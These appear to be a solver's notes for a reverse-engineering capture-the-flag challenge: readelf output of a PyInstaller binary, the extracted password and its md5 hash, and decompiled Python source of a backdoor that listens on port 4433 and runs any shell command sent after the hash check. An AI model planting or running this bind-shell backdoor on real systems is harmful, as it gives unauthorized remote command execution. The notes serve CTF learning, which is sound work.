forks child process
listens on port 4433
0.0.0.0:4433

pyinstaller compiled binary


┌──(coyote㉿kalifast)-[~/…/ca/reversing/backdoor/htb]
└─$ readelf -S bd                 
There are 30 section headers, starting at offset 0x6b4f58:

Section Headers:
  [Nr] Name              Type             Address           Offset
       Size              EntSize          Flags  Link  Info  Align
  [ 0]                   NULL             0000000000000000  00000000
       0000000000000000  0000000000000000           0     0     0
  [ 1] .interp           PROGBITS         00000000000002a8  000002a8
       000000000000001c  0000000000000000   A       0     0     1
  [ 2] .note.ABI-tag     NOTE             00000000000002c4  000002c4
       0000000000000020  0000000000000000   A       0     0     4
  [ 3] .note.gnu.bu[...] NOTE             00000000000002e4  000002e4
       0000000000000024  0000000000000000   A       0     0     4
  [ 4] .gnu.hash         GNU_HASH         0000000000000308  00000308
       0000000000000034  0000000000000000   A       5     0     8
  [ 5] .dynsym           DYNSYM           0000000000000340  00000340
       0000000000000798  0000000000000018   A       6     1     8
  [ 6] .dynstr           STRTAB           0000000000000ad8  00000ad8
       0000000000000320  0000000000000000   A       0     0     1
  [ 7] .gnu.version      VERSYM           0000000000000df8  00000df8
       00000000000000a2  0000000000000002   A       5     0     2
  [ 8] .gnu.version_r    VERNEED          0000000000000ea0  00000ea0
       0000000000000070  0000000000000000   A       6     2     8
  [ 9] .rela.dyn         RELA             0000000000000f10  00000f10
       0000000000000198  0000000000000018   A       5     0     8
  [10] .rela.plt         RELA             00000000000010a8  000010a8
       00000000000006c0  0000000000000018  AI       5    24     8
  [11] .init             PROGBITS         0000000000002000  00002000
       0000000000000017  0000000000000000  AX       0     0     4
  [12] .plt              PROGBITS         0000000000002020  00002020
       0000000000000490  0000000000000010  AX       0     0     16
  [13] .plt.got          PROGBITS         00000000000024b0  000024b0
       0000000000000008  0000000000000008  AX       0     0     8
  [14] .text             PROGBITS         00000000000024c0  000024c0
       0000000000003991  0000000000000000  AX       0     0     16
  [15] .fini             PROGBITS         0000000000005e54  00005e54
       0000000000000009  0000000000000000  AX       0     0     4
  [16] .rodata           PROGBITS         0000000000006000  00006000
       00000000000013d0  0000000000000000   A       0     0     8
  [17] .eh_frame_hdr     PROGBITS         00000000000073d0  000073d0
       0000000000000254  0000000000000000   A       0     0     4
  [18] .eh_frame         PROGBITS         0000000000007628  00007628
       0000000000000e18  0000000000000000   A       0     0     8
  [19] .init_array       INIT_ARRAY       0000000000009d70  00008d70
       0000000000000008  0000000000000008  WA       0     0     8
  [20] .fini_array       FINI_ARRAY       0000000000009d78  00008d78
       0000000000000008  0000000000000008  WA       0     0     8
  [21] .data.rel.ro      PROGBITS         0000000000009d80  00008d80
       0000000000000040  0000000000000000  WA       0     0     32
  [22] .dynamic          DYNAMIC          0000000000009dc0  00008dc0
       0000000000000200  0000000000000010  WA       6     0     8
  [23] .got              PROGBITS         0000000000009fc0  00008fc0
       0000000000000028  0000000000000008  WA       0     0     8
  [24] .got.plt          PROGBITS         000000000000a000  00009000
       0000000000000258  0000000000000008  WA       0     0     8
  [25] .data             PROGBITS         000000000000a258  00009258
       0000000000000010  0000000000000000  WA       0     0     8
  [26] .bss              NOBITS           000000000000a280  00009268
       000000000000e240  0000000000000000  WA       0     0     32
  [27] .comment          PROGBITS         0000000000000000  00009268
       000000000000001c  0000000000000001  MS       0     0     1
  [28] pydata            PROGBITS         0000000000000000  00009284
       00000000006abbc6  0000000000000000           0     0     1
  [29] .shstrtab         STRTAB           0000000000000000  006b4e4a
       000000000000010b  0000000000000000           0     0     1
Key to Flags:
  W (write), A (alloc), X (execute), M (merge), S (strings), I (info),
  L (link order), O (extra OS processing required), G (group), T (TLS),
  C (compressed), x (unknown), o (OS specific), E (exclude),
  l (large), p (processor specific)

readelf -x 28 bd > python_dump 


echo -n s4v3_th3_w0rld | md5sum 
e2162a8692df4e158e6fd33d1467dfe0

send exactly this md5 sum




# decompyle3 version 3.3.2
# Python bytecode 3.8 (3413)
# Decompiled from: Python 3.9.1 (default, Dec  8 2020, 07:51:42) 
# [GCC 10.2.0]
# Embedded file name: bd.py
import socket
from hashlib import md5
from subprocess import check_output
sock = socket.socket()
sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
sock.bind(('0.0.0.0', 4433))
sock.listen(5)
while True:
    while True:
        client, addr = sock.accept()
        data = client.recv(32)
        if len(data) != 32:
            client.close()

    if data.decode() != md5('s4v3_th3_w0rld').hexdigest():
        client.send('Invalid')
        client.close()
    else:
        size = client.recv(1)
        command = client.recv(int.from_bytes(size, 'little'))
        if not command.startswith('command:'):
            client.close()
        else:
            command = command.replace('command:', '')
            output = check_output(command, shell=True)
            client.send(output)
            client.close()
# okay decompiling bd2.pyc
